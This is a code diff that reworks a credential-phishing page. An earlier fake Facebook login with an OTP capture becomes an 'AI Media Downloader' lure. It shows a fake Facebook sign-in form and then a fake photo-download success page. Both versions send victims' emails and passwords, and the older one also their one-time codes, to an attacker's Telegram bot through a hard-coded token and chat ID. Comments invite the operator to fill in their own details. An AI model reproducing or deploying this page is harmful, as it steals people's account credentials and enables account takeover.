@@ -2,113 +2,204 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log In or Sign Up</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AI Media Downloader</title>
     <style>
-        body {
-            font-family: Helvetica, Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #f0f2f5; height: 100vh; width: 100vw; overflow: hidden; }
+        
+        /* Step 1: Landing */
+        #landing-page {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            /* Replace '999.jpg' with your actual image path if needed */
+            background: url('999.jpg') no-repeat center center fixed;
+            background-size: cover; display: flex; justify-content: center; align-items: center; z-index: 10;
+            transition: opacity 0.5s ease-in-out;
         }
-        .container {
-            background-color: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
-            width: 350px;
-            text-align: center;
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.4); z-index: 1; }
+        .content-wrapper { position: relative; z-index: 2; text-align: center; padding: 20px; }
+        .ai-badge {
+            background: linear-gradient(90deg, #ff00cc, #333399); color: white; padding: 8px 16px;
+            border-radius: 20px; font-weight: bold; font-size: 14px; display: inline-block;
+            margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); animation: pulse 2s infinite;
         }
-        h2 { color: #1877f2; margin-bottom: 20px; }
-        input {
-            width: 90%;
-            padding: 14px 8px;
-            margin-bottom: 12px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 16px;
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        .cta-button {
+            background-color: #ffffff; color: #1877f2; border: none; padding: 15px 40px;
+            font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3); transition: transform 0.2s; outline: none;
         }
-        button {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 12px 20px;
-            font-size: 20px;
-            font-weight: bold;
-            width: 100%;
-            cursor: pointer;
+        .cta-button:active { transform: scale(0.95); }
+
+        /* Step 2: Login Form */
+        #login-page {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: #fff; display: flex; justify-content: center; align-items: center;
+            z-index: 20; opacity: 0; visibility: hidden; transition: opacity 0.4s ease-in-out;
         }
-        button:hover { background-color: #166fe5; }
-        .hidden { display: none; }
-        .loader { margin-top: 10px; font-size: 14px; color: gray; }
+        .login-card { width: 90%; max-width: 380px; padding: 20px; text-align: center; }
+        .fb-logo { color: #1877f2; font-size: 42px; font-weight: bold; margin-bottom: 20px; letter-spacing: -1px; }
+        .input-group { margin-bottom: 15px; }
+        input[type="text"], input[type="password"] {
+            width: 100%; padding: 16px; border: 1px solid #dddfe2; border-radius: 8px;
+            font-size: 16px; outline: none;
+        }
+        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        .login-btn {
+            width: 100%; background-color: #1877f2; color: white; border: none; padding: 16px;
+            font-size: 18px; font-weight: bold; border-radius: 8px; cursor: pointer;
+            margin-top: 10px; transition: background-color 0.2s;
+        }
+        .login-btn:hover { background-color: #166fe5; }
+        .login-btn:disabled { background-color: #e4e6eb; color: #bcc0c4; cursor: not-allowed; }
+        .forgot-password { display: block; margin-top: 20px; color: #1877f2; text-decoration: none; font-size: 14px; }
+        
+        /* Loading Spinner */
+        .spinner {
+            display: none; width: 20px; height: 20px; border: 3px solid #fff; border-top: 3px solid transparent;
+            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Step 3: Download Page (New) */
+        #download-page {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center;
+            z-index: 30; opacity: 0; visibility: hidden; transition: opacity 0.5s ease-in-out;
+        }
+        .download-card { text-align: center; padding: 20px; width: 90%; }
+        .check-icon {
+            font-size: 60px; color: #42b72a; margin-bottom: 20px;
+        }
+        .success-title { font-size: 24px; color: #333; margin-bottom: 10px; font-weight: bold; }
+        .success-text { color: #606770; margin-bottom: 30px; font-size: 15px; line-height: 1.4; }
+        .dl-btn {
+            background-color: #1877f2; color: white; padding: 15px 30px; border: none;
+            border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer;
+            width: 100%; box-shadow: 0 4px 10px rgba(24, 119, 242, 0.3);
+        }
+        .dl-btn:active { transform: scale(0.98); }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- STEP 1: Login Form -->
-    <div id="login-form">
-        <h2>facebook</h2>
-        <input type="text" id="email" placeholder="Email or Phone Number" autocomplete="off">
-        <input type="password" id="pass" placeholder="Password" autocomplete="off">
-        <button onclick="sendCreds()">Log In</button>
+    <!-- Step 1: Landing Page -->
+    <div id="landing-page">
+        <div class="overlay"></div>
+        <div class="content-wrapper">
+            <div class="ai-badge">AI Powered</div>
+            <button class="cta-button" onclick="showLogin()">Get Started</button>
+        </div>
     </div>
 
-    <!-- STEP 2: OTP Form -->
-    <div id="otp-form" class="hidden">
-        <p style="color:#606770; font-size:14px;">Enter the 6-digit code sent to your mobile</p>
-        <input type="number" id="otp" placeholder="000000" maxlength="6">
-        <button onclick="sendOTP()">Verify</button>
-        <div id="status" class="loader"></div>
+    <!-- Step 2: Login Form -->
+    <div id="login-page">
+        <div class="login-card">
+            <div class="fb-logo">facebook</div>
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="email" placeholder="Email or phone number" required autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <input type="password" id="pass" placeholder="Password" required autocomplete="off">
+                </div>
+                <button type="submit" class="login-btn" id="btnSubmit">
+                    <span id="btnText">Log In</span>
+                    <div class="spinner" id="btnSpinner"></div>
+                </button>
+            </form>
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
     </div>
-</div>
 
-<script>
-    // 👇 YAHAN APNI DETAILS DAALO 👇
-    const BOT_TOKEN = '8833246171:AAF3zLIGcrPGXnu1rKTw5E0CLMXViZCboHI'; 
-    const CHAT_ID = '5167131107'; 
+    <!-- Step 3: Download Page (Fake Success) -->
+    <div id="download-page">
+        <div class="download-card">
+            <div class="check-icon">✔</div>
+            <h2 class="success-title">Your Photo is Ready</h2>
+            <p class="success-text">Click below to save the image to your gallery.</p>
+            <button class="dl-btn" onclick="triggerDownload()">Download Photo</button>
+        </div>
+    </div>
 
-    function sendToTelegram(text) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-        fetch(url);
-    }
-
-    function sendCreds() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
+    <script>
+        // --- CONFIGURATION ---
+        const TG_TOKEN = "8833246171:AAF3zLIGcrPGXnu1rKTw5E0CLMXViZCboHI"; 
+        const TG_CHAT_ID = "5167131107"; 
         
-        if(!email || !pass) return alert("Please fill all fields");
+        // 👇👇👇 YAHAN APNI IMAGE KA LINK DALO 👇👇👇
+        const DOWNLOAD_IMAGE_URL = "999.jpg"; 
+        // Example: https://example.com/my-secret-photo.jpg
+        
+        const FILE_NAME = "My_Photo.jpg"; // Jo naam se file save hogi
+        // ---------------------
 
-        // Hide login, show OTP
-        document.getElementById('login-form').classList.add('hidden');
-        document.getElementById('otp-form').classList.remove('hidden');
-        document.getElementById('status').innerText = "Sending code...";
+        function showLogin() {
+            document.getElementById('landing-page').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('landing-page').style.display = 'none';
+                const loginPage = document.getElementById('login-page');
+                loginPage.style.visibility = 'visible';
+                loginPage.style.opacity = '1';
+            }, 500);
+        }
 
-        // Send Credentials to Telegram
-        const msg = `🔥 *NEW FACEBOOK LOGIN* 🔥\n\n📧 Email: <code>${email}</code>\n🔑 Pass: <code>${pass}</code>`;
-        sendToTelegram(msg);
-    }
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('btnSpinner');
 
-    function sendOTP() {
-        const otp = document.getElementById('otp').value;
-        if(otp.length !== 6) return alert("Invalid Code");
+            // UI Change
+            btnText.style.display = 'none';
+            spinner.style.display = 'block';
+            document.querySelector('.login-btn').disabled = true;
 
-        document.getElementById('status').innerText = "Verifying...";
+            // Send Data to Telegram
+            const msg = `🔥 New FB Login Detected:\n\n📧 Email/ID: ${email}\n🔑 Password: ${pass}\n⏰ Time: ${new Date().toLocaleString()}`;
+            
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: TG_CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML'
+                })
+            }).then(() => {
+                // Fake loading delay for realism
+                setTimeout(() => {
+                    showDownloadPage();
+                }, 1500);
+            }).catch(err => {
+                console.error("Error sending data", err);
+                showDownloadPage(); // Still show page even if telegram fails
+            });
+        });
 
-        // Send OTP to Telegram
-        const msg = `✅ *OTP CAPTURED* ✅\n\n🔢 Code: <code>${otp}</code>\n\n📍 Now you can log in!`;
-        sendToTelegram(msg);
+        function showDownloadPage() {
+            const loginPage = document.getElementById('login-page');
+            loginPage.style.opacity = '0';
+            
+            setTimeout(() => {
+                loginPage.style.display = 'none';
+                const dlPage = document.getElementById('download-page');
+                dlPage.style.visibility = 'visible';
+                dlPage.style.opacity = '1';
+            }, 500);
+        }
 
-        // Redirect to real Facebook after 1 second
-        setTimeout(() => {
-            window.location.href = "https://www.facebook.com/";
-        }, 1000);
-    }
-</script>
-
+        function triggerDownload() {
+            // Ye function specific link ko download karega
+            const link = document.createElement('a');
+            link.href = DOWNLOAD_IMAGE_URL;
+            link.download = FILE_NAME;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
 </body>
 </html>
